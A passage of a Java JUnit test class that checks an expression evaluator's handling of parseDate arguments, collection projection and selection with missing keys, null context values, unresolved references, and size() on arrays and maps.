    }

    @Test
    void testParseDateWithNoArgumentsThrowsInStrictMode() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=parseDate()"), Collections.emptyMap()));

        assertTrue(expressionEvaluationException.getMessage()
            .contains("parseDate"), expressionEvaluationException.getMessage());
    }

    @Test
    void testParseDateWithTooManyArgumentsThrowsInStrictMode() {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(
                Map.of("value", "=parseDate('2026-08-26', 'yyyy-MM-dd', 'extra')"), Collections.emptyMap()));
    }

    @Test
    void testParseDateWithNonStringFormatReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate('2026-08-26', 5)"), Collections.emptyMap(), true);

        assertEquals("=parseDate('2026-08-26', 5)", MapUtils.get(map, "value"));
    }

    @Test
    void testProjectionResolvesAKeyMissingFromTheFirstItemToNull() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.![email]"),
            Map.of("users", List.of(Map.of("id", 2), Map.of("id", 1, "email", "a@x.io"))));

        assertEquals(Arrays.asList(null, "a@x.io"), map.get("emails"));
    }

    @Test
    void testProjectionResolvesAKeyMissingFromEveryItemToNull() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.![email]"), Map.of("users", List.of(Map.of("id", 1), Map.of("id", 2))));

        assertEquals(Arrays.asList(null, null), map.get("emails"));
    }

    @Test
    void testSelectionSkipsItemsMissingTheKey() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.?[email != null].![email]"),
            Map.of("users", List.of(Map.of("id", 2), Map.of("id", 1, "email", "a@x.io"))));

        assertEquals(List.of("a@x.io"), map.get("emails"));
    }

    @Test
    void testProjectionOverAnUnresolvedReferenceStaysUnresolved() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.![email]"), Collections.emptyMap());

        assertEquals("=${users}.![email]", map.get("emails"));
    }

    @Test
    void testMissingNestedKeyOutsideAProjectionStaysUnresolved() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("formula", "=${task.email}", "text", "${task.email}"), Map.of("task", Map.of("id", 1)));

        assertEquals("=${task.email}", map.get("formula"));
        assertEquals("${task.email}", map.get("text"));
    }

    @Test
    void testMissingNestedKeyOutsideAProjectionStaysUnresolvedWhenTheFormulaAlsoProjects() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "={task: ${task.email}, emails: ${users}.![email]}"),
            Map.of("task", Map.of("id", 1), "users", List.of(Map.of("id", 2))));

        assertEquals("={task: ${task.email}, emails: ${users}.![email]}", map.get("value"));
    }

    @Test
    void testProjectionOfANestedPathResolvesMissingKeysToNull() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("cities", "=${users}.![address.city]"),
            Map.of(
                "users",
                List.of(Map.of("id", 1), Map.of("address", Map.of()), Map.of("address", Map.of("city", "Zagreb")))));

        assertEquals(Arrays.asList(null, null, "Zagreb"), map.get("cities"));
    }

    @Test
    void testSelectionOnANestedPathSkipsItemsMissingIt() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("ids", "=${users}.?[address.city == 'Zagreb'].![id]"),
            Map.of(
                "users",
                List.of(
                    Map.of("id", 1), Map.of("id", 2, "address", Map.of()),
                    Map.of("id", 3, "address", Map.of("city", "Zagreb")))));

        assertEquals(List.of(3), map.get("ids"));
    }

    @Test
    void testProjectionAppliesOperatorsToAMissingKey() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.![email ?: 'none']"),
            Map.of("users", List.of(Map.of("id", 2), Map.of("id", 1, "email", "a@x.io"))));

        assertEquals(List.of("none", "a@x.io"), map.get("emails"));
    }

    @Test
    void testProjectionKeepsInlineMapKeys() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("contacts", "=${users}.![{mail: email}]"),
            Map.of("users", List.of(Map.of("id", 2), Map.of("id", 1, "email", "a@x.io"))));

        assertEquals(
            List.of(Collections.singletonMap("mail", null), Map.of("mail", "a@x.io")), map.get("contacts"));
    }

    @Test
    void testProjectionThroughThisResolvesAMissingKeyToNull() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("emails", "=${users}.![#this.email]"),
            Map.of("users", List.of(Map.of("id", 2), Map.of("id", 1, "email", "a@x.io"))));

        assertEquals(Arrays.asList(null, "a@x.io"), map.get("emails"));
    }

    @Test
    void testNameSeededWithNullResolvesToNull() {
        Map<String, Object> context = new HashMap<>();

        context.put("disabledTask", null);

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("value", "${disabledTask}"), context);

        assertTrue(map.containsKey("value"));
        assertNull(MapUtils.get(map, "value"));
    }

    @Test
    void testPropertyAccessOnNameSeededWithNullResolvesToNull() {
        Map<String, Object> context = new HashMap<>();

        context.put("disabledTask", null);

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of(
                "formula", "=disabledTask.field", "index", "${disabledTask[0].field}",
                "nested", "${disabledTask.field.nested}", "value", "${disabledTask.field}"),
            context);

        assertTrue(map.containsKey("value"));
        assertNull(MapUtils.get(map, "value"));
        assertNull(MapUtils.get(map, "nested"));
        assertNull(MapUtils.get(map, "index"));
        assertNull(MapUtils.get(map, "formula"));
    }

    @Test
    void testPropertyAccessOnNullNestedValueStillReturnsOriginalExpression() {
        Map<String, Object> context = new HashMap<>();
        Map<String, Object> task = new HashMap<>();

        task.put("field", null);

        context.put("task", task);

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("value", "${task.field.nested}"), context);

        assertEquals("${task.field.nested}", MapUtils.get(map, "value"));
    }

    @Test
    void testPropertyAccessOnMissingNameStillReturnsOriginalExpression() {
        Map<String, Object> map = EVALUATOR.evaluate(Map.of("value", "${unknownTask.field}"), Collections.emptyMap());

        assertEquals("${unknownTask.field}", MapUtils.get(map, "value"));
    }

    @Test
    void testSizeOfArray() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("size", "=size(${textHelper_1})", "last", "=${textHelper_1}[size(${textHelper_1}) - 1]"),
            Map.of("textHelper_1", "prvi,drugi,treci,cetvrti".split(",")));

        assertEquals(4, MapUtils.getInteger(map, "size"));
        assertEquals("cetvrti", map.get("last"));
    }

    @Test
    void testSizeOfMap() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("size", "=size(${map})"), Map.of("map", Map.of("a", 1, "b", 2)));

        assertEquals(2, MapUtils.getInteger(map, "size"));
    }
}
